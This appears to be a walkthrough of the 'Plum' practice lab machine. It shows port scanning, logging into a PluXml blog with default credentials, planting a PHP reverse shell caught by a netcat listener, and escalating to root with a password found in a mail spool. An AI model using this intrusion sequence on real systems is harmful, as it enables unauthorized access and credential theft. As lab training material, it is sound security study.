# Plum

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.229.28

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: PluXml - Blog or CMS, XML powered !
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

```shell
# Check authentication methods on port 22
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.229.28

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 80

Navigating to port 80 of the server, we find a PluXml Blog, with an "Administration" button at the bottom of the page that redirects us to a login page. There, we were able to log in using the admin:admin credentials.

We found the application is version 5.8.7 and found an exploit on GitHub. Following the instructions in the PDF linked from the exploit page, we replaced the Static 1 page with a malicious PHP reverse shell from pentestmonkey.

## Initial Access

```shell
# Listener
rlwrap -cAra nc -vnlp 443
```

When we click on "View page Static 1 on site", we get the reverse connection.

```shell
# TTY Upgrade
whereis python
/usr/bin/python3.9 -c 'import pty; pty.spawn("/bin/bash")'

# Evidence
find / -iname local.txt 2>/dev/null
cat /var/www/local.txt
b75749dcd1febbaa7a83524e3db95670
```

## Privilege Escalation

We initially enumerated the machine looking for binaries with SUID enabled and found `exim4`.

```shell
# SUID
find / -perm /4000 2>/dev/null
/usr/sbin/exim4
```

In the Debian repository, we discovered that this binary is a mail transport agent, confirmed by viewing what is running in loopback on the machine.

```shell
ss -nlpt
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
LISTEN 0      20         127.0.0.1:25        0.0.0.0:*
LISTEN 0      511                *:80              *:*

nc 127.0.0.1 25
HELP
```

By listing the emails in `/var/mail`, we can find the root user's password.

```shell
cat /var/mail/www-data

To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
...
We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator
```

We changed the user to root and thus escalated privileges on the machine.

```shell
su root # 6s8kaZZNaZZYBMfh2YEW
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
cat /root/proof.txt
```
